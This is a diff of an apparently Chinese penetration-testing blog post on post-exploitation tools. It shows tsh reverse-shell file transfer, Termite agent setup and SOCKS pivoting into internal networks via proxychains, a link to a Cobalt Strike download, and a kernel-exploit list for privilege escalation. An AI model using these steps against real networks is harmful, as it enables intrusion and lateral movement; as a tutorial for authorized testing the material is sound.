@@ -133,7 +133,28 @@
 <p>上传跟下载文件，如下所示，在反向shell中只需要吧<hostname>换成cb就行了。</hostname></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tsh &lt;hostname&gt; get &lt;要下载的文件&gt; &lt;本地路径&gt;./tsh &lt;hostname&gt; put &lt;要上传的文件&gt; &lt;远程路劲&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="termite-http-rootkiter-com-Termite"><a href="#termite-http-rootkiter-com-Termite" class="headerlink" title="termite - http://rootkiter.com/Termite/"></a>termite - <a href="http://rootkiter.com/Termite/" target="_blank" rel="external">http://rootkiter.com/Termite/</a></h2><p>termite是EarthWorm作者的开发的另一款边界穿透工具，朋友推荐给我的，功能还是很强大的，但是当时因为没有解决shell的auto logout的问题，所以经常不知道是不是掉线了，需要重启admin程序才知道，所以还是有一点蛋疼的。</p>
-<p>首先在</p>
+<p>可以看到作者提供了非常多的版本的工具，其实我们最常用的也就是Linux，windows还有macOS的。</p>
+<p><img src="/media/15409766292369.jpg" alt=""></p>
+<p>首先我们需要一个管理所有节点的agent，一般这个agent是自己的vps，运行<code>./agent_linux_x86_64 -l 12312 &amp;</code>，监听12312端口。一直放到后台跑就行了。</p>
+<p>在本机上使用admin端连接我们的vps。<code>./admin -c vps的ip -p vps监听的端口</code></p>
+<p><img src="/media/15409767621722.jpg" alt=""></p>
+<p>可以看到我们已经连接上管理机了。</p>
+<blockquote>
+<p>当用户注销（logout）或者网络断开时，终端会收到 HUP（hangup）信号从而关闭其所有子进程。<br>所以我们需要一种靠谱的方式，让我们的进程不受shell的退出或者网络的因素所影响。参考这篇文章 <a href="https://www.ibm.com/developerworks/cn/linux/l-cn-nohup/index.html" target="_blank" rel="external">https://www.ibm.com/developerworks/cn/linux/l-cn-nohup/index.html</a></p>
+</blockquote>
+<p>将网络边界的机器加入到节点管理中。<br><img src="/media/15409794481988.jpg" alt=""></p>
+<p>当前的所有agent。<br><img src="/media/15409794143269.jpg" alt=""></p>
+<p>其实在实际渗透内网的时候，我们最需要就是能够我们的流量给转发到内网中，termite可以很方便的开启一个socks端口，并且转发到我们本机。只需要在节点2上，执行<code>socks 端口</code>，就可以了，简直不要太方便。</p>
+<p><img src="/media/15409796615668.jpg" alt=""></p>
+<p>使用proxychain进行流量转发。更改proxychain的配置。</p>
+<p><img src="/media/15409797712947.jpg" alt=""></p>
+<p>然后使用proxychain转发流量就行了。<br><img src="/media/15409803076002.jpg" alt=""></p>
+<p>proxychain在Mac下需要关闭sip，要不无法代理。</p>
+<p>Termite这个工具看起来非常的方便，但是在实际使用中，感觉并不是那么尽如人意。最重要的是，不稳，非常的不稳。admin跟管理机的连接还没有什么问题，主要是管理机跟剩下几个节点的连接，常常有断开的情况，并且，admin这边并没有察觉，只有执行一个shell命令，看看能不能弹回来，才能发现时哪个机器掉线了。（这个有可能跟网络环境有关系，毕竟实际网络环境相当复杂。）</p>
+<h2 id="cobaltstrike-https-eyun-baidu-com-s-3dEES1u5-sharelink-path-2F"><a href="#cobaltstrike-https-eyun-baidu-com-s-3dEES1u5-sharelink-path-2F" class="headerlink" title="cobaltstrike - https://eyun.baidu.com/s/3dEES1u5#sharelink/path=%2F"></a>cobaltstrike - <a href="https://eyun.baidu.com/s/3dEES1u5#sharelink/path=%2F" target="_blank" rel="external">https://eyun.baidu.com/s/3dEES1u5#sharelink/path=%2F</a></h2><p>这个网上资料挺多的，我这里就不赘述了，主要就是找到上面的这个资源还挺全的。</p>
+<p>这个工具啥都好，图形界面，能与msf连接，就是不支持linux的shell，如果有大哥知道如何监听linux的shell，小弟感激不尽~</p>
+<h2 id="常见提权"><a href="#常见提权" class="headerlink" title="常见提权"></a>常见提权</h2><p>超全linux提权<br><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="external">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+<p>但是有的时候还不如直接Google如下字符串 <code>2.6.32-xxx exploit</code></p>
 </section>
     <!-- Tags START -->
     
@@ -173,7 +194,7 @@
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#后渗透的数个工具使用与坑点-tsh-termite-cobaltstrike-常见提权"><span class="toc-nav-text">后渗透的数个工具使用与坑点(tsh termite cobaltstrike 常见提权)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Intro"><span class="toc-nav-text">Intro</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#tsh-https-github-com-orangetw-tsh"><span class="toc-nav-text">tsh - https://github.com/orangetw/tsh</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#termite-http-rootkiter-com-Termite"><span class="toc-nav-text">termite - http://rootkiter.com/Termite/</span></a></li></ol></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#后渗透的数个工具使用与坑点-tsh-termite-cobaltstrike-常见提权"><span class="toc-nav-text">后渗透的数个工具使用与坑点(tsh termite cobaltstrike 常见提权)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Intro"><span class="toc-nav-text">Intro</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#tsh-https-github-com-orangetw-tsh"><span class="toc-nav-text">tsh - https://github.com/orangetw/tsh</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#termite-http-rootkiter-com-Termite"><span class="toc-nav-text">termite - http://rootkiter.com/Termite/</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#cobaltstrike-https-eyun-baidu-com-s-3dEES1u5-sharelink-path-2F"><span class="toc-nav-text">cobaltstrike - https://eyun.baidu.com/s/3dEES1u5#sharelink/path=%2F</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#常见提权"><span class="toc-nav-text">常见提权</span></a></li></ol></li></ol>
     
   </div>
 </aside>
